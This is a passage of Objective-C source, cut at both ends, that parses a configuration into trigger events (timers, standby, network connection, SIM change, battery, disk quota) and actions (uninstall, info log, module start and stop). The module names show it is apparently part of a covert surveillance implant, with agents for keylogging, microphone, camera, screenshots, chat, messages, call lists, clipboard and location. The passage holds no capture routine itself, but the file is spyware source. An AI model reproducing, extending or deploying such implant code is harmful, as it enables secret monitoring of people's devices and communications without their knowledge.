                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
             
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

/////////////////////////////////////////////////////
// temporary methods for emulate old timers
//
// Done.
- (NSTimeInterval)calculateMsecFromMidnight:(NSString*)aDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSTimeInterval msec = 0;
  
  if (aDate == nil)
    return msec;
  
  NSRange fixedRange;
  fixedRange.location = 11;
  fixedRange.length   = 8;
  
  //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Get current date string UTC
  NSDate *now = [NSDate date];
  NSString *currDateStr = [inFormat stringFromDate: now];
  
  [inFormat release];
  
  // Create string from current date: yyyy-MM-dd hh:mm:ss ZZZ
  NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
  
  // reset current date time to midnight
  [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
  
  NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
  [outFormat setTimeZone:timeZone];
  [outFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
  
  // Current midnite
  NSDate *midnight = [outFormat dateFromString: dayStr];
  
  // Set current date time to aDate
  [dayStr replaceCharactersInRange: fixedRange withString: aDate];
  
  NSDate *date = [outFormat dateFromString: dayStr];
  
  [outFormat release];
  [dayStr release];
  
  msec = [date timeIntervalSinceDate: midnight];
  msec *= 1000;
  
  [pool release];
  
  return  msec;
}

// Done.
- (int64_t)calculateWinDate:(NSString*)aDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aDate == nil)
    return 0;
  
  // date description format: YYYY-MM-DD HH:MM:SS ±HHMM
  // UTC timers
  NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
  
  NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
  [inFormat setTimeZone:timeZone];
  [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
  
  // Get date string UTC
  NSDate *theDate = [inFormat dateFromString: aDate];
  [inFormat release];
  NSTimeInterval unixTime = [theDate timeIntervalSince1970];
  int64_t winTime = (unixTime * RATE_DIFF) + EPOCH_DIFF;

 [pool release];
  
  return  winTime;
}

- (int64_t)calculateDaysDate:(NSNumber*)aDay
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  int64_t days;
  
  if (aDay == nil)
    return 0;
  
  // days in 100nanosec * secXHour * hourXdays
  days = (int64_t)[aDay intValue] * TIMER_100NANOSEC_PER_DAY;
  
  [pool release];
  
  return  days;
}

/////////////////////////////////////////////////////
// Done.
- (u_int)timerGetSubtype:(NSDictionary*)anEvent
{
  u_int type = TIMER_UNKNOWN;
  
  NSString *eventType = [anEvent objectForKey: EVENT_TYPE_KEY];
  
  if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame)
    {
      NSString *subtype = [anEvent objectForKey: EVENTS_TIMER_SUBTYPE_KEY];
      
      if (subtype == nil)
        type = TIMER_UNKNOWN;
      else if ([subtype compare: EVENTS_TIMER_SUBTYPE_LOOP_KEY] == NSOrderedSame)
        type = TIMER_LOOP;
      else if ([subtype compare: EVENTS_TIMER_SUBTYPE_DAILY_KEY] == NSOrderedSame)
        type = TIMER_DAILY;
//      else if ([subtype compare: EVENTS_TIMER_SUBTYPE_STARTUP_KEY] == NSOrderedSame) /*no more present!*/
//        type = TIMER_AFTER_STARTUP;

    }
  else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame)
    type = TIMER_DATE;
  else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame)
    type = TIMER_INST;
  
  return type;
}

/////////////////////////////////////////////////////
// Old timers mapping:
//
// TIMER_DATE, TIMER_INST -> EVENTS_TIMER_DATE_KEY, EVENTS_TIMER_AFTERINST_KEY
// TIMER_AFTER_STARTUP, TIMER_LOOP, TIMER_DAILY -> EVENTS_TIMER_KEY
// Done.
- (void)addTimerEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  timerStruct_t timerStruct;
  
  memset(&timerStruct, 0, sizeof(timerStruct));
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_TIMER];  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  
  timerStruct.type = [self timerGetSubtype:anEvent];
  timerStruct.endAction = (end != nil ? [end unsignedIntValue] : 0xFFFFFFFF);
  
  switch (timerStruct.type) 
  {
    case TIMER_LOOP:
    {
      timerStruct.loDelay = delay != nil ? [delay intValue] : 0xFFFFFFFF;
      if (delay != nil)
        timerStruct.loDelay *= 1000;
      break;
    }  
    case TIMER_DAILY:
    {
      timerStruct.loDelay = [self calculateMsecFromMidnight:[anEvent objectForKey:EVENTS_TIMER_TS_KEY]];
      timerStruct.hiDelay = [self calculateMsecFromMidnight:[anEvent objectForKey:EVENTS_TIMER_TE_KEY]];
    break;
    }
    case TIMER_DATE:
    {
      int64_t winDate = [self calculateWinDate:[anEvent objectForKey: EVENTS_TIMER_DATEFROM_KEY]];
      timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;
      timerStruct.hiDelay = (winDate >> 32) & 0x00000000FFFFFFFF;
    break;
    }
    case TIMER_INST:
    {
      int64_t winDate = [self calculateDaysDate:[anEvent objectForKey: EVENTS_TIMER_DAYS_KEY]];
      timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;
      timerStruct.hiDelay = (winDate >> 32) & 0x00000000FFFFFFFF;
      break;
    }
    //    case TIMER_AFTER_STARTUP: /* no more on rcs8 */
    //    {
    //      timerStruct.loDelay = delay != nil ? [delay intValue] : 0xFFFFFFFF;
    //      if (delay != nil)
    //        timerStruct.loDelay *= 1000;
    //      break;
    //    }
    default:
    {
      timerStruct.hiDelay = 0;
      timerStruct.loDelay = 0;
      break;
    }
  }
  
  data = [NSData dataWithBytes: &timerStruct length: sizeof(timerStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
             
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// Done.
- (void)addStandbyEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  int actionExit = 0xFFFFFFFF;
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_SCREENSAVER];
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  
  actionExit = (end != nil ? [end intValue] : 0xFFFFFFFF);

  data = [NSData dataWithBytes: &actionExit length:sizeof(int)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
             
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// only iOS
- (void)addSimchangeEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects; 
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_SIM_CHANGE];
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];

  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       @"",
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// Done. check network byte order.
- (void)addConnectionEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  connectionStruct_t conStruct;
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_CONNECTION];  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  
  memset(&conStruct, 0, sizeof(conStruct));
  
  if ([anEvent objectForKey:@"ip"] != nil)
    {
        NSString *ipString  = [anEvent objectForKey:@"ip"];
        NSData *ipData      = [ipString dataUsingEncoding:NSUTF8StringEncoding];
        conStruct.ipAddress = inet_addr([ipData bytes]);
    }
  else
    conStruct.ipAddress = 0;
  
  if ([anEvent objectForKey:@"netmask"] != nil)
    {
      NSString *maskString  = [anEvent objectForKey:@"netmask"];
      NSData *maskData      = [maskString dataUsingEncoding:NSUTF8StringEncoding];
      conStruct.netMask     = inet_addr([maskData bytes]);
    }
  else
    conStruct.netMask = 0;
  
  if ([anEvent objectForKey:@"port"] != nil)
    {
      NSNumber *port  = [anEvent objectForKey:@"port"];
      conStruct.port  = htons([port intValue]);
    }
  else
    conStruct.port = 0; 
     
  data = [NSData dataWithBytes: &conStruct length: sizeof(conStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil]; 
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// only iOS
- (void)addBatteryEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  batteryLevelStruct_t battStruct;

  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_BATTERY];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  NSNumber *min     = [anEvent objectForKey: EVENT_BATT_MIN_KEY];
  NSNumber *max     = [anEvent objectForKey: EVENT_BATT_MAX_KEY];
  
  memset(&battStruct, 0, sizeof(battStruct));
  
  battStruct.onClose   = (end != nil ? [end unsignedIntValue] : 0xFFFFFFFF);
  battStruct.minLevel  = (min != nil ? [min unsignedIntValue] : 0xFFFFFFFF);
  battStruct.maxLevel  = (max != nil ? [max unsignedIntValue] : 0xFFFFFFFF);
  
  data = [NSData dataWithBytes: &battStruct length: sizeof(battStruct)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// only iOS
- (void)addACEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_AC];
  
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
    
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       @"",
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

// Done.
// Fake event: never runned, but using when disable/enable a event by a action
// (the parmater is the position of the event)
- (void)addNULLEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_NULL];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       defNum, 
                                       @"",
                                       EVENT_START, 
                                       @"", 
                                       defNum,
                                       defNum,
                                       defNum,
                                       defNum,
                                       defNum,
                                       defNum,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

typedef struct {
  UInt32 disk_quota;
  UInt32 tag;
  UInt32 exit_event;
} quota_conf_entry_t;

// Done.
- (void)addQuotaEvent: (NSDictionary *)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *keys;
  NSArray *objects;
  NSData  *data;
  quota_conf_entry_t _quota;
  
  NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
  
  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_QUOTA];
  NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
  NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
  NSNumber *quota   = [anEvent objectForKey: EVENTS_QUOTA_KEY];
  
  _quota.disk_quota = (quota != nil ? [quota intValue] : 0xFFFFFFFF);
  _quota.exit_event = (end != nil ? [end intValue] : 0xFFFFFFFF);
  
  data = [NSData dataWithBytes: &_quota length:sizeof(quota_conf_entry_t)];
  
  keys = [NSArray arrayWithObjects: @"type", 
                                    @"actionID", 
                                    @"data",
                                    @"status", 
                                    @"monitor", 
                                    @"enabled",
                                    @"start",
                                    @"repeat",
                                    @"delay",
                                    @"iter",
                                    @"end",
                                    nil];
  
  objects = [NSArray arrayWithObjects: type, 
                                       action  != nil ? action  : defNum, 
                                       data,
                                       EVENT_START, 
                                       @"", 
                                       enabled != nil ? enabled : defNum,
                                       action  != nil ? action  : defNum,
                                       repeat  != nil ? repeat  : defNum,
                                       delay   != nil ? delay   : defNum,
                                       iter    != nil ? iter    : defNum,
                                       end     != nil ? end     : defNum,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  
  NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
  
  [eventConfiguration addEntriesFromDictionary: dictionary];
  
  [mEventsList addObject: eventConfiguration];
  
  [eventConfiguration release];
  
  [pool release];
}

- (void)parseAndAddEvents:(NSDictionary *)dict
{
  NSArray *eventsArray = [dict objectForKey: EVENTS_KEY];
  
  if (eventsArray == nil) 
    return;
  
  for (int i=0; i < [eventsArray count]; i++) 
    {
    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc]init];
    
    NSDictionary *event = (NSDictionary *)[eventsArray objectAtIndex: i];
    
    NSString *eventType = [event objectForKey: EVENT_TYPE_KEY];
    
    if (eventType != nil)
      {     
        if ([eventType compare: EVENTS_PROC_KEY] == NSOrderedSame) 
          {
            [self addProcessEvent: event];
          }
        else if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame) 
          {
            [self addTimerEvent: event];
          }
        else if ([eventType compare: EVENTS_TIMER_DATE_KEY] == NSOrderedSame) 
          {
            [self addTimerEvent: event];
          }
        else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame) 
          {
            [self addTimerEvent: event];
          }
        else if ([eventType compare: EVENTS_STND_KEY] == NSOrderedSame) 
          {
            [self addStandbyEvent: event];
          }
        else if ([eventType compare: EVENTS_CONN_KEY] == NSOrderedSame) 
          {
            [self addConnectionEvent: event];
          }
        else if ([eventType compare: EVENTS_QUOTA_KEY] == NSOrderedSame) 
          {
            [self addQuotaEvent: event];
          }
        else if ([eventType compare: EVENTS_SIM_KEY] == NSOrderedSame) 
          {
            // only iOS
            [self addSimchangeEvent: event];
          }
        else if ([eventType compare: EVENTS_BATT_KEY] == NSOrderedSame) 
          {
            // only iOS
            [self addBatteryEvent: event];
          }
        else if ([eventType compare: EVENTS_AC_KEY] == NSOrderedSame) 
          {
            // only iOS
            [self addACEvent: event];
          }
        else
          { // Default event: for keep order number in list when a actionEvent is triggered
            // : the trigger param is position in list of event
            [self addNULLEvent: event];
          }
      }
    
    [inner release];
    }
  
}

#
#
#pragma mark Actions parsing
#
#

// Done.
- (NSMutableDictionary *)initActionUninstall:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *type   = [NSNumber numberWithUnsignedInt: ACTION_UNINSTALL];
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                              type, @"type", status, @"status", @"", @"data", nil];
  
  [pool release];
  
  return subActDict;
}

// Done. XXX- checking utf8 o utf16 encoding
- (NSMutableDictionary *)initActionInfolog:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *type      = [NSNumber numberWithUnsignedInt: ACTION_INFO];
  NSNumber *status    = [NSNumber numberWithUnsignedInt: 0];
  NSMutableData *data = [[NSMutableData alloc] initWithCapacity:0];
  
  NSString *infoText = [subAction objectForKey: ACTION_INFO_TEXT_KEY];
  
  int32_t len = [infoText lengthOfBytesUsingEncoding: NSUTF16StringEncoding];
  
  //[data appendBytes: &len length:sizeof(int32_t)];
  
  if (infoText == nil) 
    [data appendData: [@"" dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
  else
    [data appendData: [infoText dataUsingEncoding: NSUTF16LittleEndianStringEncoding]]; 
  
  NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                      type, @"type", status, @"status", data, @"data", nil];
                                  
  [data release];
  [pool release];
  
  return subActDict;
}

// Done.
- (NSMutableDictionary *)initActionModule:(NSDictionary *)subAction
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  UInt32 tmpAgentID = MODULE_UNKNOWN;
  NSMutableDictionary *subActDict = nil;
  NSNumber *status = [NSNumber numberWithUnsignedInt: 0];
  NSNumber *type;  
  NSData   *data = nil;
  
  NSString *moduleName = (NSString *)[subAction objectForKey: ACTION_MODULE_KEY];
  NSString *moduleStat = (NSString *)[subAction objectForKey: ACTION_MODULE_STATUS_KEY];
  
  if (moduleStat == nil || moduleName == nil)
    return nil;
  
  // start/stop action    
  if ([moduleStat compare: ACTION_MODULE_START_KEY] == NSOrderedSame) 
    {
      type = [NSNumber numberWithUnsignedInt:ACTION_AGENT_START]; 
    }
  else
    {
      type = [NSNumber numberWithUnsignedInt:ACTION_AGENT_STOP];
    }
  
  if ([moduleName compare: ACTION_MODULE_ADDB] == NSOrderedSame)
    {
      tmpAgentID = AGENT_ORGANIZER;
    }
  else if ([moduleName compare: ACTION_MODULE_APPL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_APPLICATION;
    }
//  else if ([moduleName compare: ACTION_MODULE_CAL] == NSOrderedSame)
//    {
//      tmpAgentID = AGENT_ORGANIZER;
//    }
  else if ([moduleName compare: ACTION_MODULE_CALL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_VOIP;
    }
  else if ([moduleName compare: ACTION_MODULE_CALLLIST] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CALL_LIST;
    }
  else if ([moduleName compare: ACTION_MODULE_CAMERA] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CAM;
    }
  else if ([moduleName compare: ACTION_MODULE_CHAT] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CHAT;
    }
  else if ([moduleName compare: ACTION_MODULE_CLIP] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CLIPBOARD;
    }
  else if ([moduleName compare: ACTION_MODULE_CONF] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CALL_DIVERT;
    }
  else if ([moduleName compare: ACTION_MODULE_CRISIS] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CRISIS;
    }
  else if ([moduleName compare: ACTION_MODULE_DEV] == NSOrderedSame)
    {
      tmpAgentID = AGENT_DEVICE;
    }
  else if ([moduleName compare: ACTION_MODULE_KEYL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_KEYLOG;
    }
  else if ([moduleName compare: ACTION_MODULE_LIVEM] == NSOrderedSame)
    {
      tmpAgentID = AGENT_CALL_DIVERT;
    }
  else if ([moduleName compare: ACTION_MODULE_MIC] == NSOrderedSame)
    {
      tmpAgentID = AGENT_MICROPHONE;
    }
  else if ([moduleName compare: ACTION_MODULE_MSGS] == NSOrderedSame)
    {
      tmpAgentID = AGENT_MESSAGES;
    }
  else if ([moduleName compare: ACTION_MODULE_POS] == NSOrderedSame)
    {
      tmpAgentID = AGENT_POSITION;
    }
  else if ([moduleName compare: ACTION_MODULE_SNAPSHOT] == NSOrderedSame)
    {
      tmpAgentID = AGENT_SCREENSHOT;
    }
  else if ([moduleName compare: ACTION_MODULE_URL] == NSOrderedSame)
    {
      tmpAgentID = AGENT_URL;
    }
  else if ([moduleName compare: ACTION_MODULE_MOUSE] == NSOrderedSame)
    {
    tmpAgentID = AGENT_MOUSE;
    }
    
  data = [[NSData alloc] initWithBytes: &tmpAgentID length: sizeof(tmpAgentID)];
  
  subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                type, @"type", status, @"status", data, @"data", nil];
  
  [data release];
  
  [pool release];
  
  return subActDict;
}

// Done.
- (NSMutableDictionary *)initActionSync:(NSDictionary *)subAction
{  
